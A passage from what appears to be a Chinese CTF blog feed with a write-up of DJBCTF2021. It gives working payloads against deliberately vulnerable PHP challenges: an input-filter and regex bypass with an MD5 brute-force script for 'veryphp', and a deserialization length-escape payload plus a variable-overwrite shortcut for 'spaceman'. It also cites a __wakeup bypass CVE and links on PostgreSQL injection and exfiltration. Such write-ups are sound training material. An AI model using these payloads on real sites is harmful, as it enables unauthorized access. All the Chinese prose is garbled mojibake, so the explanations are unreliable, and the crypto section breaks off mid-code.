href="https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection/dblink-lo_import-data-exfiltration">https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection/dblink-lo_import-data-exfiltration</a></p><p><a href="https://balsn.tw/ctf_writeup/20190603-facebookctf/">https://balsn.tw/ctf_writeup/20190603-facebookctf/</a></p><p><a href="https://ha1c9on.top/2021/01/31/2021-cqb-write-up/">https://ha1c9on.top/2021/01/31/2021-cqb-write-up/</a> laä½¬åšå®¢ï¼Œå¸Œæœ›èƒ½å’Œå¸ˆå‚…ä¸€æ ·å¼ºï¼Œèƒ½å’Œå¸ˆå‚…æ¢å‹é“¾</p><p><a href="https://blog.pentesteracademy.com/postgresql-udf-command-execution-372f0c68cfed">https://blog.pentesteracademy.com/postgresql-udf-command-execution-372f0c68cfed</a> (å†™udfçš„ï¼Œæ²¡ç”¨ä¸Š2333)</p><p><a href="http://www.postgres.cn/docs/9.4/functions-datetime.html#FUNCTIONS-DATETIME-DELAY">http://www.postgres.cn/docs/9.4/functions-datetime.html#FUNCTIONS-DATETIME-DELAY</a></p><p><a href="https://www.postgresql.org/docs/11/dblink.html">https://www.postgresql.org/docs/11/dblink.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DJBCTF2021</title>
      <link href="article/djbctf2021/"/>
      <url>article/djbctf2021/</url>
      
        <content type="html"><![CDATA[<p>2021ç¬¬ä¸€åœºæ¯”èµ›</p><p>æ˜µç§°ï¼šåˆ«ç­”äº†åˆ«ç­”äº†å†ç­”äººå‚»äº†</p><a id="more"></a><p>DJBctfï¼Œå­©å­å¤ªèœäº†å‘œå‘œå‘œ</p><p>åšäº†ä¸¤é“webï¼Œç­¾åˆ°é¢˜æœ‰éé¢„æœŸ(æ±—)ï¼Œåˆ†æä¸‹é¢„æœŸå’Œéé¢„æœŸè§£æ³•ï¼ŒåŠ ä¸Šäº›ä¸ªäººçš„ç†è§£</p><p>æœ¬Webç‹—ä½•å¾·ä½•èƒ½ï¼Œå°è¯•åšäº†ä¸€é“å¯†ç å­¦â€¦èµ›åæ‰ç»ˆäºå‡ºäº†ã€‚</p><hr><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="veryphp"><a href="#veryphp" class="headerlink" title="veryphp"></a>veryphp</h3><p>æºç </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"config.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">qwq</span><span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Access Denied!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">oao</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"config.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"php://input"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/\`|\_|\.|%|\*|\~|\^|\'|\"|\;|\(|\)|\]|g|e|l|i|\//is'</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"I am sorry but you have to leave."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$shaw_root</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/^\-[a-e][^a-zA-Z0-8]&lt;b>(.*)>&#123;4&#125;\D*?(abc.*?)p(hp)*\@R(s|r).$/'</span><span class="token punctuation">,</span> <span class="token variable">$shaw_root</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$shaw_root</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">29</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$hint</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"Almost there."</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"Input correct parameters"</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ans</span><span class="token operator">===</span><span class="token variable">$SecretNumber</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"Congratulations!"</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$my_ans</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>æœ‰ä¸€ä¸ªç±»ï¼Œå¯èƒ½æ˜¯ååºåˆ—åŒ–ï¼Œä½†çœ‹åˆ°æœ€å<code>call_user_func</code>ï¼Œç±»é‡Œé¢è¿˜æœ‰ä¸ªstaticå‡½æ•°ï¼Œåº”è¯¥æ˜¯ç›´æ¥è°ƒç”¨äº†ã€‚</p><p>çœ‹é€»è¾‘ï¼Œ<code>php://input</code>ï¼Œå˜é‡<code>str</code>ä»POSTåŸå§‹æµè¯»å–æ•°æ®ï¼Œè¿‡æ»¤åå˜é‡è¦†ç›–ã€‚ç„¶åä¼ å…¥<code>shaw_root</code>ï¼Œæ»¡è¶³æ¡ä»¶ä¼šç»™hintï¼Œæœ€å<code>$ans===$SecretNumber</code>å³å¯è°ƒç”¨å‡½æ•°äº†ã€‚</p><hr><p>é¦–å…ˆä¼ <code>shaw_root</code>ï¼Œç¬¬ä¸€ä¸ªç‚¹åœ¨è¿‡æ»¤äº†<code>_</code>ï¼Œæ ¹æ®PHPç‰¹æ€§ï¼Œ<code>ç©ºæ ¼</code>ï¼Œ<code>.</code>ä¼ é€’æœ€åéƒ½ä¼šè½¬å˜ä¸º<code>-</code></p><p>å¦‚å›¾æ‰€ç¤ºï¼Œæ­¤ä¸ºweb3çš„è°ƒè¯•ï¼Œä¸æœ¬é¢˜æ­¤è€ƒç‚¹ä¸€è‡´</p><img src="/article/djbctf2021/image-20210128164708984.png" class="" title="image-20210128164708984" loading="lazy"><img src="/article/djbctf2021/image-20210128164811979.png" class="" title="image-20210128164811979" loading="lazy"><p>ä¼ å…¥ç©ºæ ¼ï¼Œ<code>.</code>éƒ½å˜æˆäº†<code>_</code></p><p>æ¥ä¸‹æ¥å°±æ˜¯ç»•æ­£åˆ™äº†ï¼Œå»regex101è°ƒäº†åŠå¤©(æ²¡å­¦æ­£åˆ™çš„æ‡’ç‹—â€”â€“&gt;æˆ‘)ï¼Œè°ƒäº†ä¸€ä¸ªpayload</p><img src="/article/djbctf2021/image-20210128165252056.png" class="" title="image-20210128165252056" loading="lazy"><p><code>-a9&lt;b&gt;a\n\n&gt;&gt;&gt;&gt;&gt;&gt;abcccphp@Rra</code></p><p>ä¼ å…¥å¾—</p><img src="/article/djbctf2021/image-20210128165654959.png" class="" title="image-20210128165654959" loading="lazy"><pre class="language-none"><code class="language-none">Here is a hint : md5(&quot;shaw&quot;.($SecretNumber).&quot;root&quot;)&#x3D;&#x3D;166b47a5cb1ca2431a0edfcef200684f &amp;&amp; strlen($SecretNumber)&#x3D;&#x3D;&#x3D;5</code></pre><p>å†™è„šæœ¬çˆ†ç ´,è„šæœ¬å¦‚ä¸‹</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token triple-quoted-string string">"""@Time ï¼š 2021/1/23 16:58@Auth ï¼š gyy@Blog ï¼šhttp://err0r.top"""</span><span class="token keyword">import</span> hashlib<span class="token keyword">def</span> <span class="token function">MD5</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> <span class="token number">10000</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        text <span class="token operator">=</span> <span class="token string">"shaw&#123;&#125;root"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>        m <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>text<span class="token punctuation">,</span>m<span class="token punctuation">)</span>        m <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>        <span class="token keyword">if</span> m <span class="token operator">==</span> target <span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\nfind it:'</span><span class="token punctuation">,</span>text<span class="token punctuation">,</span><span class="token string">":"</span><span class="token punctuation">,</span>m<span class="token punctuation">)</span>            <span class="token keyword">break</span>        i <span class="token operator">+=</span><span class="token number">1</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    MD5<span class="token punctuation">(</span><span class="token string">'166b47a5cb1ca2431a0edfcef200684f'</span><span class="token punctuation">)</span></code></pre><p>çˆ†ç ´å¾—<code>shaw21475root</code></p><img src="/article/djbctf2021/image-20210128170204123.png" class="" title="image-20210128170204123" loading="lazy"><p>ä¼ å…¥æˆåŠŸ</p><img src="/article/djbctf2021/image-20210128170309356.png" class="" title="image-20210128170309356" loading="lazy"><p>è¡¨æ˜æˆåŠŸäº†ï¼Œæœ€åä¸€æ­¥è°ƒç”¨å‡½æ•°ï¼Œæ ¹æ®PHPæ–‡æ¡£ï¼Œç±»staticå‡½æ•°å¯ä»¥ç›´æ¥ç”¨<code>class::static function</code>è°ƒç”¨ï¼Œè¯¦æƒ…è§<a href="https://www.php.net/manual/zh/function.call-user-func.php">å®˜æ–¹æ–‡æ¡£</a></p><p>æœ€ç»ˆpayload:<code>shaw root=-a9&lt;b&gt;a\n\n&gt;&gt;&gt;&gt;&gt;&gt;abcccphp@Rra&amp;&amp;ans=21475&amp;&amp;my ans=qwq::oao</code></p><img src="/article/djbctf2021/image-20210128170748201.png" class="" title="image-20210128170748201" loading="lazy"><p>è¿™é‡Œè¦æ³¨æ„ï¼Œå¦‚æœç”¨HackBarå‘åŒ…çš„è¯è¦æ¢æ¨¡å¼</p><img src="/article/djbctf2021/image-20210128170832793.png" class="" title="image-20210128170832793" loading="lazy"><p>å› ä¸ºè½¬ä¹‰æ˜¯é˜»æŒ¡ä½ å‰è¿›æ­¥ä¼çš„ä¸€å¤§å…ƒå‡¶</p><h4 id="é¢˜ç›®æ€è€ƒ"><a href="#é¢˜ç›®æ€è€ƒ" class="headerlink" title="é¢˜ç›®æ€è€ƒ"></a>é¢˜ç›®æ€è€ƒ</h4><p>å› ä¸ºå˜é‡è¦†ç›–ï¼Œç›´æ¥æŠŠ<code>SecretNumber</code>è¦†ç›–å°±è¡Œäº†ï¼Œæœ¬é¢˜åœ¨<code>str</code>å¤„æœ‰ä¸ªè¿‡æ»¤<code>e</code>ï¼Œæ‰€ä»¥ä¸è¡Œ</p><p><code>php://input</code>è¯»å…¥åŸå§‹æµæ•°æ®ï¼Œæ‰€ä»¥å–åå¼‚æˆ–è½¬ä¹‰ä¹‹ç±»çš„æ–¹æ³•éƒ½æ˜¯ä¸è¡Œçš„</p><hr><h3 id="spaceman"><a href="#spaceman" class="headerlink" title="spaceman"></a>spaceman</h3><p>Webç­¾åˆ°é¢˜(å¤§æ¦‚)ï¼Œæºç </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">spaceman</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token operator">===</span><span class="token single-quoted-string string">'ctfshowvip'</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token single-quoted-string string">'wrong password'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'ctfshowup'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'ctfshow'</span><span class="token punctuation">,</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"php://input"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/\_|\.|\]|\[/is'</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"I am sorry but you have to leave."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$ser</span> <span class="token operator">=</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">spaceman</span><span class="token punctuation">(</span><span class="token variable">$user_name</span><span class="token punctuation">,</span><span class="token variable">$pass_word</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$test</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$ser</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>æ ‡å‡†ååºåˆ—åŒ–é•¿åº¦é€ƒé€¸ï¼Œå¯æƒœéé¢„æœŸäº†</p><h4 id="é¢„æœŸè§£"><a href="#é¢„æœŸè§£" class="headerlink" title="é¢„æœŸè§£"></a>é¢„æœŸè§£</h4><p>çœ‹<code>spaceman</code>ç±»ï¼Œä¸¤ä¸ªå˜é‡ç”±é­”æœ¯æ–¹æ³•<code>__construct</code>èµ‹å€¼ï¼Œ<code>filter</code>å‡½æ•°æ›¿æ¢å­—ç¬¦ä¸²ï¼ŒåŸºæœ¬ä¸Šå°±ç¡®å®šæœ¬é¢˜æ˜¯ååºåˆ—åŒ–é•¿åº¦é€ƒé€¸äº†ã€‚</p><p>åŒæ ·ï¼Œ<code>php://input</code>è¯»å–åŸå§‹æµæ•°æ®å˜é‡è¦†ç›–ï¼Œç»•è¿‡æ–¹æ³•åŒweb1ï¼Œæ„é€ ååºåˆ—åŒ–</p><p><code>str_replace</code>å°†<code>ctfshowup</code>æ›¿æ¢ä¸º<code>ctfshow</code>ï¼Œä¹Ÿå°±æ˜¯è¯´åŸæ¥9ä¸ªå­—ç¬¦å˜æˆäº†7ä¸ªå­—ç¬¦ï¼Œæœ‰ä¸¤ä¸ªå­—ç¬¦é€ƒé€¸äº†ã€‚</p><p>æˆ‘ä»¬çš„æ ¸å¿ƒç›®æ ‡æ˜¯å°†<code>password</code>è¦†ç›–ä¸º<code>ctfshowvip</code>ï¼Œæ‰€ä»¥æœ€åéƒ¨åˆ†çš„åºåˆ—åŒ–å­—ç¬¦ä¸²åº”ä¸º<code>;s:8:&quot;password&quot;;s:10:&quot;ctfshowvip&quot;;&#125;</code>ï¼Œä¸€å…±35ä¸ªå­—ç¬¦ã€‚</p><p>æ‰€ä»¥å®ƒåŸå§‹ç”Ÿæˆçš„éƒ¨åˆ†åº”è¯¥è¢«è¦†ç›–çš„ä¸º<code>&quot;;s:8:&quot;password&quot;;s:35:</code>å³22ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥<code>username</code>åº”è¯¥å¡«å…¥11ä¸ª<code>ctfshowup</code>æ¥è¦†ç›–å®ƒ</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">spaceman</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'ctfshowup'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'ctfshow'</span><span class="token punctuation">,</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$user_name</span><span class="token operator">=</span><span class="token double-quoted-string string">"ctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowup"</span><span class="token punctuation">;</span><span class="token variable">$pass_word</span><span class="token operator">=</span><span class="token double-quoted-string string">";s:8:\"password\";s:10:\"ctfshowvip\";&#125;"</span><span class="token punctuation">;</span><span class="token variable">$ser</span> <span class="token operator">=</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">spaceman</span><span class="token punctuation">(</span><span class="token variable">$user_name</span><span class="token punctuation">,</span><span class="token variable">$pass_word</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//$test = unserialize($ser);</span><span class="token keyword">echo</span> <span class="token variable">$ser</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>æœ€ç»ˆpayload</p><p><code>user name=ctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowup&amp;&amp;pass word=;s:8:&quot;password&quot;;s:10:&quot;ctfshowvip&quot;;&#125;</code></p><p>è®°å¾—ç©ºæ ¼ç»•<code>_</code></p><img src="/article/djbctf2021/image-20210128173924844.png" class="" title="image-20210128173924844" loading="lazy"><h4 id="éé¢„æœŸè§£"><a href="#éé¢„æœŸè§£" class="headerlink" title="éé¢„æœŸè§£"></a>éé¢„æœŸè§£</h4><p>ç”±äºå˜é‡è¦†ç›–ï¼Œç›´æ¥è¦†ç›–<code>pass_word</code>å³å¯</p><p>payloadï¼š<code>pass word=ctfshowvip</code></p><img src="/article/djbctf2021/image-20210128174153341.png" class="" title="image-20210128174153341" loading="lazy"><h4 id="é¢˜ç›®æ€è€ƒ-1"><a href="#é¢˜ç›®æ€è€ƒ-1" class="headerlink" title="é¢˜ç›®æ€è€ƒ"></a>é¢˜ç›®æ€è€ƒ</h4><p><strong>å½“æˆå‘˜å±æ€§æ•°ç›®å¤§äºå®é™…æ•°ç›®æ—¶å¯ç»•è¿‡wakeupæ–¹æ³•(CVE-2016-7124)</strong> </p><p>æ¼æ´å½±å“ç‰ˆæœ¬ï¼š</p><p>PHP5 &lt; 5.6.25</p><p>PHP7 &lt; 7.0.10</p><p>ç»å…¸çš„ååºåˆ—åŒ–é•¿åº¦é€ƒé€¸çš„é¢˜ç›®äº†</p><hr><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="å¤§ä½¬ä»¬å¸®æˆ‘çœ‹çœ‹æˆ‘è¿™ä¸ªPythonè„šæœ¬ä¸ºä»€ä¹ˆè¿è¡Œä¸äº†å•Š"><a href="#å¤§ä½¬ä»¬å¸®æˆ‘çœ‹çœ‹æˆ‘è¿™ä¸ªPythonè„šæœ¬ä¸ºä»€ä¹ˆè¿è¡Œä¸äº†å•Š" class="headerlink" title="å¤§ä½¬ä»¬å¸®æˆ‘çœ‹çœ‹æˆ‘è¿™ä¸ªPythonè„šæœ¬ä¸ºä»€ä¹ˆè¿è¡Œä¸äº†å•Š"></a>å¤§ä½¬ä»¬å¸®æˆ‘çœ‹çœ‹æˆ‘è¿™ä¸ªPythonè„šæœ¬ä¸ºä»€ä¹ˆè¿è¡Œä¸äº†å•Š</h3><p>é¢˜ç›®æè¿°</p><pre class="language-none"><code class="language-none">èœé¸¡ 9:36:27èœé¸¡ä¸Šä¼ äº†æ–‡ä»¶ æ–°å»ºæ–‡æœ¬æ–‡æ¡£.pyèœé¸¡ 9:37:02key1: Do you want a DaJiBei?èœé¸¡ 9:37:61å¤§ä½¬ä»¬å¸®æˆ‘çœ‹çœ‹æˆ‘è¿™ä¸ªPythonè„šæœ¬ä¸ºä»€ä¹ˆè¿è¡Œä¸äº†å•Š</code></pre><p>hint1:</p><pre class="language-none"><code class="language-none">æœ€ç»ˆç»“æœæ˜¯è‡ªå¸¦flagæ ¼å¼çš„ï¼Œå¯ä»¥æ®æ­¤åˆ¤æ–­ç»“æœæ˜¯å¦æ­£ç¡®ï¼Œä¸å¿…æµªè´¹æ—¶é—´å°è¯•æäº¤æ ¼å¼</code></pre><p>hint2:</p><pre class="language-none"><code class="language-none">ä¸ºä»€ä¹ˆè¿è¡Œç»“æœé‡Œå¥½å¥½çš„3ï¼Œä¹Ÿè¦å†™æˆå¤§å°å†™æ··ä¹±çš„æ ·å­ï¼Ÿ</code></pre><p>hint3:</p><pre class="language-none"><code class="language-none">å¦‚æœæŸä¸ªæ–¹å‘å·²ç»æ‰¾ä¸åˆ°æ›´å¤šçš„çº¿ç´¢ï¼Œä¸å¦¨å›å¤´çœ‹çœ‹æ¥æ—¶çš„é“è·¯</code></pre><p>hint4:</p><pre class="language-none"><code class="language-none">æœ¬é¢˜çš„åŠ å¯†æ–¹å¼æ¥æºäºå¯¹ä»¥ä¸‹é—®é¢˜çš„æ€è€ƒï¼šå¦‚ä½•åœ¨åŒä¸€ä¸ªè½½ä½“ä¸ŠåŠ å¯†ä¸¤æ®µä¿¡æ¯ï¼Œä¸”è¯»å–å…¶ä¸­ä¸€ç§ä¿¡æ¯çš„è¿‡ç¨‹ä¼šä»¤å¦ä¸€ç§ä¿¡æ¯è¢«ç ´åï¼›å¹¶ä¸”ï¼Œå¦‚æœå‰ä¸€ç§ä¿¡æ¯çš„è¯»å–æ–¹å¼è¶³å¤Ÿæ˜¾è€Œæ˜“è§ï¼Œæ˜¯å¦å¯ä»¥åœ¨æœ‰é™çš„çŸ­æ—¶é—´å†…å°½å¯èƒ½è½¬ç§»æ³¨æ„åŠ›ï¼Œå‡å°‘éé¢„æœŸæ¥æ”¶è€…å‘ç°å¦ä¸€æ®µä¿¡æ¯çš„å¯èƒ½æ€§ï¼Ÿ ä¸ºäº†é™ä½éš¾åº¦ï¼Œæœ¬é¢˜åœ¨é€‰æ‹©æ¯ä¸€ç§ä¿¡æ¯çš„åŠ å¯†æ–¹å¼æ—¶ï¼Œå°½å¯èƒ½é€‰æ‹©äº†å¤æ‚åº¦è¾ƒä½çš„åšæ³•ï¼›åŒæ—¶ï¼Œå°†å…¶ä¸­ä¸€æ®µä¿¡æ¯ï¼ˆç›¸ä¿¡å¤§å®¶éƒ½å·²ç»æ‰¾åˆ°è¿™ä¸€æ®µäº†ï¼‰è®¾è®¡ä¸ºå¦ä¸€æ®µä¿¡æ¯åŠ å¯†æ–¹å¼çš„æç¤ºã€‚</code></pre><p>hint5:</p><img src="/article/djbctf2021/hint.png" class="" title="hint.png" loading="lazy"><p>æœ€ç»ˆæç¤ºhint5ç›´æ¥ç‚¹æ˜æ‘©æ–¯å¯†ç </p><p>é¢˜ç›®åŸä»¶</p><pre class="language-python" data-language="python"><code class="language-python">fROM CRYPTO<span class="token punctuation">.</span>utIL<span class="token punctuation">.</span>NuMBER IMPORT BYteS_TO_LoNG<span class="token punctuation">,</span> long_TO_BYTESA_Fake_FLaG <span class="token operator">=</span> <span class="token string">B'FLag&#123;I_AM_the_TRUE_Flag_trUST_me&#125;'</span>nuMBER <span class="token operator">=</span> bYTEs_tO_long<span class="token punctuation">(</span>a_FAKE_FLAG<span class="token punctuation">)</span>KeY1 <span class="token operator">=</span> <span class="token string">B'DO yOU WAnT A DAJIBEI?'</span>KEY1 <span class="token operator">=</span> Bytes_to_lONG<span class="token punctuation">(</span>KEY1<span class="token punctuation">)</span>KEY2 <span class="token operator">=</span> <span class="token number">0XBCD2deE7E7114B5C856F8DAECeD0782BD891200B4D8264D854A13D53cF1F0c481b</span>iv <span class="token operator">=</span> <span class="token number">10800</span>KEY3 <span class="token operator">=</span> KeY2 <span class="token operator">*</span> IVIS_THIS_rEAL_FlAG <span class="token operator">=</span> <span class="token punctuation">(</span>NUmber <span class="token operator">+</span> kEY3<span class="token punctuation">)</span> <span class="token 